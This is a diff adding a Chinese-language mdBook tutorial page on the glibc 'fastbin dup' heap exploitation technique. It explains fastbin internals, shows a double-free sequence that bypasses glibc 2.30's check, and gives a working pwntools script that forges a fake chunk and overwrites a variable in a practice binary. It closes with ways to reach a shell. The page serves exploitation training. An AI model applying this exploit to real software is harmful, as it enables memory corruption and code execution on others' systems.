@@ -1,0 +1,333 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js light">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>fastbin_dup - glibc_heap_exploit_technique</title>
+        <!-- Custom HTML head -->
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="../favicon.svg">
+        <link rel="shortcut icon" href="../favicon.png">
+        <link rel="stylesheet" href="../css/variables.css">
+        <link rel="stylesheet" href="../css/general.css">
+        <link rel="stylesheet" href="../css/chrome.css">
+        <link rel="stylesheet" href="../css/print.css" media="print">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../highlight.css">
+        <link rel="stylesheet" href="../tomorrow-night.css">
+        <link rel="stylesheet" href="../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="../introduction/Introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><a href="../house_of_force/house_of_force.html"><strong aria-hidden="true">2.</strong> House of force</a></li><li class="chapter-item expanded "><a href="../fastbin_dup/fastbin_dup.html" class="active"><strong aria-hidden="true">3.</strong> fastbin_dup</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">glibc_heap_exploit_technique</h1>
+
+                    <div class="right-buttons">
+                        <a href="../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="fastbin-dup"><a class="header" href="#fastbin-dup">fastbin dup</a></h1>
+<p>本文介绍一种叫<strong>fastbin dup</strong>的 heap 溢出利用技巧</p>
+<p>本质上这是一种double free漏洞，通过double free改写数据链表指针，达到任意写的目的。</p>
+<p>首先，我们先了解一下fastbin内存的管理机制：</p>
+<h3 id="fastbin机制"><a class="header" href="#fastbin机制">fastbin机制</a></h3>
+<p>众所周知，Linux系统下，调用<code>malloc</code>函数，libc库会动态地分配内存。</p>
+<blockquote>
+<p>所谓“动态”， 就是指malloc的大小编译时未知，运行时才能知道，比如等待用户输入。这样，一个不可避免的问题是：大小不一的内存块，如何高效利用？为达到高效，要尽可能保持内存连片，要尽可能避免出现新调用的<code>malloc</code>在旧内存块里找不到合适大小的，或者即使能找到，但太大，又要分割，导致进一步的碎片化。</p>
+<p>工程经验上来说，小块的内存申请的频率比较高，且造成碎片化的可能性很高，所以要引入链表的数据结构进行管理。</p>
+</blockquote>
+<p>对于libc来说，小内存块(0x20 - 0x80)都属于fastbin的范畴。下面以 <a href="../../fastbin_dup/fastbin_demo">fastbin_demo</a> 为例，阐述fastbin大小的内存申请和释放的过程：</p>
+<p>在gdb中加载 <a href="../../fastbin_dup/fastbin_demo">fastbin_demo</a> ，在main函数打断点，逐行运行程序到下图位置：</p>
+<p><img src="fastbin_dup.assets/a.png" alt="a" /></p>
+<p>这时，已经运行了三行malloc代码，用命令<code>vis</code>查看当前heap的状态：</p>
+<p><img src="fastbin_dup.assets/b.png" alt="b" /></p>
+<p>根据导论， 由上图可知总共有三个malloc_chunk，大小都是0x20。（这是64位系统<code>malloc</code>分配的最小大小，即使<code>malloc(0)</code>也会分配0x20）</p>
+<p>用命令<code>fastbin</code>查看当前fastbin的状态：</p>
+<p><img src="fastbin_dup.assets/c.png" alt="c" /></p>
+<p>这个各个大小的fastbin都是空的（因为已经申请的还没释放）</p>
+<p>然后，我们在执行下面的<code>free(a);</code>:</p>
+<p><img src="fastbin_dup.assets/d.png" alt="d" /></p>
+<p>这时，再查看<code>vis</code>和<code>fastbin</code></p>
+<p><img src="fastbin_dup.assets/e.png" alt="e" /></p>
+<p>可见，heap无明显变化，0x20大小的fastbin指向了原来a指向的内存块（因为执行了<code>free(a)</code>）</p>
+<p>接下来，再执行<code>free(b)</code>, 同样查看<code>vis</code>和<code>fastbin</code>:</p>
+<p><img src="fastbin_dup.assets/f.png" alt="f" /></p>
+<p>这时heap的0x405030的位置写入了0x0000000000405000， （这恰恰是上一个chunk的位置）而0x20大小的fastbin则出现了链表表示。</p>
+<p>查看源码，可知各个大小的fastbin其实就是释放出来的内存，他们之间通过单向链表的形式链接起来，每次释放一个这样大小的内存块，其地址都会被加入到这个链表里，所以就管理来说，只要我知道了这个单向链表的头，我就能找到这个链表的每一个内存块，不管你在哪个内存地址。</p>
+<p>因此，系统只需记录头的位置即可，每次加入新块，系统更新该块的位置（作为头），同时在该块里写入之前的头（维持链表）</p>
+<p>而这个头其实就是储存在main_arena里：</p>
+<p><img src="fastbin_dup.assets/g.png" alt="g" /></p>
+<p>我们再运行一行代码：</p>
+<p><img src="fastbin_dup.assets/h.png" alt="h" /></p>
+<p>内存变化符合之前描述。</p>
+<p>这时，如果我们再需要一块0x20大小的内存块，比如再malloc一次：</p>
+<p><img src="fastbin_dup.assets/hh.png" alt="hh" /></p>
+<p>libc管理算法会优先从fastbin链表中查找对应大小的链表，如果非空，直接pop第一个出来(LIFO模式)，剩下的块再保持链表。从而无需再申请新的内存块，避免因内存里遍布小内存块，而导致的内存碎片化问题。</p>
+<p>以上就是fastbin的运行机制，简单来说可以归结为：</p>
+<blockquote>
+<p>当一块小内存块要被释放时，其地址会被写入到arena里，然后原来arena上的那个地址会被写入到这块内存的fd位置，（作为单向链表的指针）当系统需要一块小内存，而对应的单向链表也是非空的时候，arena的那个地址会被返回，然后根据这个地址指向的内存块，找到块内存在这个链表里的下一块，把下一块的地址写到arena上（就是去除单向链表第一个元素的操作）</p>
+</blockquote>
+<p><img src="fastbin_dup.assets/free_demo.png" alt="free_demo" /></p>
+<p>由上可知，如果对同一块内存重复释放，每次释放，底层的操作都会照做一遍，这样会打乱它原有对于单向链表的假设，引入安全漏洞。</p>
+<h3 id="double-free"><a class="header" href="#double-free">double free</a></h3>
+<p><strong>double free</strong>也就是对某个内存块<code>free</code>两次。我们先依据fastbin机制，抽象分析一下这种操作，内存将会是一个怎么样的状态：</p>
+<p>接上图，如果我们对黄色的malloc_chunk再free一遍，依据fastbin机制，这时内存变化应该如下图所示：</p>
+<p><img src="fastbin_dup.assets/double_free_free.png" alt="double_free_free" /></p>
+<p>可见，同一块内存被free两次后，fastbin的单向链表会变成一个环状， 且有内存泄露。如果接下来又有malloc，且malloc需要的malloc_chunk大小恰好有是这个fastbin的链表所代表的大小。这时，内存的变化如下：</p>
+<p><img src="fastbin_dup.assets/double_free_malloc.png" alt="double_free_malloc" /></p>
+<p>这时，由于malloc之后，我有了黄色内存块的控制，可以读写，但是由于之前环状结构的影响，使得libc依旧认为黄色内存块是fastbin的单向链表的节点，libc依旧相信这个节点里的指针只要非空，都是指向下一个节点。换言之，我可以控制黄色内存块后的元素在任意位置（比如图中的红色内存块），然后多malloc几次，顺着这个指向，终可以malloc到那块内存上，进而我有其读写的权限。</p>
+<h3 id="任意写"><a class="header" href="#任意写">任意写</a></h3>
+<p>下面以 <a href="../../fastbin_dup/fastbin_dup">fastbin_dup</a> 为例，double free技巧的应用：</p>
+<p><img src="fastbin_dup.assets/image-20220426092021069.png" alt="image-20220426092021069" /></p>
+<p>该程序会泄露<code>puts</code>函数运行时地址，然后要求输入用户名，最后就是四个功能的循环。我们的目标是：改写target的值，表明我们有改写该程序运行时数据的能力。</p>
+<p>程序的基本安全措施如下：</p>
+<p><img src="fastbin_dup.assets/image-20220426092732300.png" alt="image-20220426092732300" /></p>
+<p>按照前面描述的double free的技巧，我们采用以下操作：malloc一次，free两次</p>
+<p><img src="fastbin_dup.assets/image-20220426092439273.png" alt="image-20220426092439273" /></p>
+<p>程序终止，似乎已经察觉到了double free的问题， 我们用gdb 调试，查看调用栈：</p>
+<p><img src="fastbin_dup.assets/image-20220426093154123.png" alt="image-20220426093154123" /></p>
+<p>可见其确实有一个防止double free的安全检测，我们按照提示，分析源码，看具体阻隔原因: </p>
+<p>首先，找到对应版本的libc源码（这里是2.30），找到对应代码位置：</p>
+<p><img src="fastbin_dup.assets/image-20220426151150868.png" alt="image-20220426151150868" /></p>
+<p>可见其确实有防止double free的安全检测，但是这个安全检测的原理是，对比需要释放malloc_chunk的地址，和当前arena上记录的地址，如果一致（说明这是一个double free）则报错，终止运行。</p>
+<p>前面知道， arena记录的地址其实就是指向空闲malloc_chunk单向链表的首个节点，当重复释放这个节点才会触发这个安全检测。一个很自然的想法是，如果我不是重复释放首个节点呢？是不是就可以绕过这个安全屏障了？下面测试一下这个想法：</p>
+<p><img src="fastbin_dup.assets/image-20220426153307020.png" alt="image-20220426153307020" /></p>
+<p>为方便查看内存状态，这里是在gdb下调试运行，先malloc两次，申请两个内存块（A和B），然后依次把它们free掉，这时fastbin里的0x20单向链表长度应该是2，如下图：</p>
+<p><img src="fastbin_dup.assets/image-20220426153625120.png" alt="image-20220426153625120" /></p>
+<p>注意这时链表的顺序应该是BA（先free的是A）如果我这时再free B， 明显会触发安全检测，但如果free A呢？</p>
+<p><img src="fastbin_dup.assets/image-20220426154516662.png" alt="image-20220426154516662" /></p>
+<p>可见，我们成功绕过了安全检测，且这时的fastbin链表出现了前面描述的环状结构：</p>
+<p><img src="fastbin_dup.assets/image-20220426154652188.png" alt="image-20220426154652188" /></p>
+<p>既然double free通过了，接下来应该就是分析malloc后，内存如何变化。</p>
+<p>留意上图中的heap内存， 如果这时malloc一次，我可以获取0x405000指向的malloc_chunk的控制权，可以改写0x405010 -- 0x405028这里面的内存（这里不考虑heap溢出的情况, 其实在libc 2.30也没有这个问题），且这时fastbin的0x20头变成0x405020, 但是环状结构的原因，头的下一个节点又指向了0x405000这块内存节点。而我可以控制这块内存，写入不同的东西，让libc觉得，这个节点后还有节点，具体指向哪里由我写入的东西决定。a.k.a. 这是一个任意写。</p>
+<p><img src="fastbin_dup.assets/image-20220426161043932.png" alt="image-20220426161043932" /></p>
+<p><img src="fastbin_dup.assets/image-20220426161103267.png" alt="image-20220426161103267" /></p>
+<p>回到最初的目标：改写target。</p>
+<p>首先，这个target是被裹在一个叫user的结构体里。user里还有另外一个叫username的，程序运行最早输入的东西会放在这里。</p>
+<p><img src="fastbin_dup.assets/image-20220426161914139.png" alt="image-20220426161914139" /></p>
+<p>如上图，username可以写入，且在target前面，一个很自然的想法是，如果有溢出，改写target就很容易了，可惜没有。</p>
+<p>可以使用前面的double free技巧，如果我控制那个单向链表指向user这个结构体。根据fastbin机制，几次malloc后必然会获得这个结构体的控制，进而可以写入东西，改写target。</p>
+<p>下面用pwntools测试这个方案：</p>
+<pre><code class="language-python"> #!/usr/bin/python3
+from pwn import *
+
+elf = context.binary = ELF(&quot;fastbin_dup&quot;)
+libc = elf.libc
+index = 0
+
+gs = '''
+continue
+'''
+def start():
+    if args.GDB:
+        return gdb.debug(elf.path, gdbscript=gs)
+    else:
+        return process(elf.path)
+
+def malloc(size, data):
+    global index
+    io.send(&quot;1&quot;)
+    io.sendafter(&quot;malloc size: &quot;, f&quot;{size}&quot;)
+    io.sendafter(&quot;malloc data: &quot;, data)
+    io.recvuntil(&quot;your option is: &quot;)
+    index += 1
+    return index - 1 
+
+def free(i):
+    io.send(&quot;2&quot;)
+    io.sendafter(&quot;index: &quot;, str(i))
+    io.recvuntil(&quot;your option is: &quot;)
+
+io = start()
+io.recvuntil(&quot;puts @ &quot;)
+libc.address = int(io.recvline(), 16) - libc.sym.puts
+
+io.recvuntil(&quot;Enter your name: &quot;,)
+# io.send('jc')
+io.send(p64(0x00)+p64(0x21))
+
+io.recvuntil(&quot;your option is: &quot;)
+io.timeout = 0.1
+
+chunk_a = malloc(1, 'aaaa')
+chunk_b = malloc(1, 'bbbb')
+
+free(chunk_a)
+free(chunk_b)
+free(chunk_a)
+
+chunk_c = malloc(1, p64(elf.sym.user))
+malloc(1, 'a')
+malloc(1, 'a')
+malloc(1, 'hello')
+io.interactive()
+</code></pre>
+<p>经测试，target确实被改成了hello</p>
+<p><img src="fastbin_dup.assets/image-20220426181046841.png" alt="image-20220426181046841" /></p>
+<p>需要注意的一点是：诱导fastbin的0x20单向链表指向user结构体时，需要把这个结构体打扮成一个malloc_chunk, 大小为0x20， 否则无法通过另外一个和chunk大小相关的检测。而这种打扮可以通过输入username来实现。下图为不打扮时遭遇的终止的call stack：</p>
+<p><img src="fastbin_dup.assets/image-20220426181813961.png" alt="image-20220426181813961" /></p>
+<h3 id="get-shell"><a class="header" href="#get-shell">Get shell</a></h3>
+<p>达到任意写，get shell 就不难了，这里提供三个思路：</p>
+<ol>
+<li>通过任意写注入shellcode， malloc hook 触发</li>
+<li>找rop gadget，同样malloc hook 触发。</li>
+<li>ret2libc 调用execve</li>
+</ol>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../house_of_force/house_of_force.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../house_of_force/house_of_force.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script type="text/javascript">
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+    </body>
+</html>
